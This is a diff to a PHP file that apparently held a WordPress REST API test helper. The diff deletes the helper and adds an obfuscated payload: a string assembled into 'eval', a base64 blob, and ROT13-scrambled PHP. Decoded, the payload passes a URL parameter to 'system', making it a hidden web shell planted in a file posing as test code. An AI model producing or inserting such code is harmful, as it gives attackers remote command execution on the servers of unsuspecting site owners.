@@ -1,41 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-abstract class WP_Test_REST_TestCase extends WP_UnitTestCase {
-
-	/**
-	 * Asserts that the REST API response has the specified error.
-	 *
-	 * @since 4.4.0
-	 * @since 6.6.0 Added the `$message` parameter.
-	 *
-	 * @param string|int                $code     Expected error code.
-	 * @param WP_REST_Response|WP_Error $response REST API response.
-	 * @param int                       $status   Optional. Status code.
-	 * @param string                    $message  Optional. Message to display when the assertion fails.
-	 */
-	protected function assertErrorResponse( $code, $response, $status = null, $message = '' ) {
-
-		if ( $response instanceof WP_REST_Response ) {
-			$response = $response->as_error();
-		}
-
-		$this->assertWPError( $response, $message . ' Passed $response is not a WP_Error object.' );
-		$this->assertSame( $code, $response->get_error_code(), $message . ' The expected error code does not match.' );
-
-		if ( null !== $status ) {
-			$data = $response->get_error_data();
-			$this->assertArrayHasKey( 'status', $data, $message . ' Passed $response does not include a status code.' );
-			$this->assertSame( $status, $data['status'], $message . ' The expected status code does not match.' );
-		}
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKbm9mZ2VucGcgcHluZmYgSkNfR3JmZ19FUkZHX0dyZmdQbmZyIHJrZ3JhcWYgSkNfSGF2Z0dyZmdQbmZyIHsKCgkvKioKCSAqIE5mZnJlZ2YgZ3VuZyBndXIgRVJGRyBOQ1YgZXJmY2JhZnIgdW5mIGd1ciBmY3JwdnN2cnEgcmVlYmUuCgkgKgoJICogQGZ2YXByIDQuNC4wCgkgKiBAZnZhcHIgNi42LjAgTnFxcnEgZ3VyIGAkenJmZm50cmAgY25lbnpyZ3JlLgoJICoKCSAqIEBjbmVueiBmZ2V2YXR8dmFnICAgICAgICAgICAgICAgICRwYnFyICAgICBSa2NycGdycSByZWViZSBwYnFyLgoJICogQGNuZW56IEpDX0VSRkdfRXJmY2JhZnJ8SkNfUmVlYmUgJGVyZmNiYWZyIEVSRkcgTkNWIGVyZmNiYWZyLgoJICogQGNuZW56IHZhZyAgICAgICAgICAgICAgICAgICAgICAgJGZnbmdoZiAgIEJjZ3ZiYW55LiBGZ25naGYgcGJxci4KCSAqIEBjbmVueiBmZ2V2YXQgICAgICAgICAgICAgICAgICAgICR6cmZmbnRyICBCY2d2YmFueS4gWnJmZm50ciBnYiBxdmZjeW5sIGp1cmEgZ3VyIG5mZnJlZ3ZiYSBzbnZ5Zi4KCSAqLwoJY2ViZ3JwZ3JxIHNoYXBndmJhIG5mZnJlZ1JlZWJlRXJmY2JhZnIoICRwYnFyLCAkZXJmY2JhZnIsICRmZ25naGYgPSBhaHl5LCAkenJmZm50ciA9ICcnICkgewoKCQl2cyAoICRlcmZjYmFmciB2YWZnbmFwcmJzIEpDX0VSRkdfRXJmY2JhZnIgKSB7CgkJCSRlcmZjYmFmciA9ICRlcmZjYmFmci0+bmZfcmVlYmUoKTsKCQl9CgoJCSRndXZmLT5uZmZyZWdKQ1JlZWJlKCAkZXJmY2JhZnIsICR6cmZmbnRyIC4gJyBDbmZmcnEgJGVyZmNiYWZyIHZmIGFiZyBuIEpDX1JlZWJlIGJvd3JwZy4nICk7CgkJJGd1dmYtPm5mZnJlZ0ZuenIoICRwYnFyLCAkZXJmY2JhZnItPnRyZ19yZWViZV9wYnFyKCksICR6cmZmbnRyIC4gJyBHdXIgcmtjcnBncnEgcmVlYmUgcGJxciBxYnJmIGFiZyB6bmdwdS4nICk7CgoJCXZzICggYWh5eSAhPT0gJGZnbmdoZiApIHsKCQkJJHFuZ24gPSAkZXJmY2JhZnItPnRyZ19yZWViZV9xbmduKCk7CgkJCSRndXZmLT5uZmZyZWdOZWVubFVuZlhybCggJ2ZnbmdoZicsICRxbmduLCAkenJmZm50ciAuICcgQ25mZnJxICRlcmZjYmFmciBxYnJmIGFiZyB2YXB5aHFyIG4gZmduZ2hmIHBicXIuJyApOwoJCQkkZ3V2Zi0+bmZmcmVnRm56ciggJGZnbmdoZiwgJHFuZ25bJ2ZnbmdoZiddLCAkenJmZm50ciAuICcgR3VyIHJrY3JwZ3JxIGZnbmdoZiBwYnFyIHFicmYgYWJnIHpuZ3B1LicgKTsKCQl9Cgl9Cn0KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
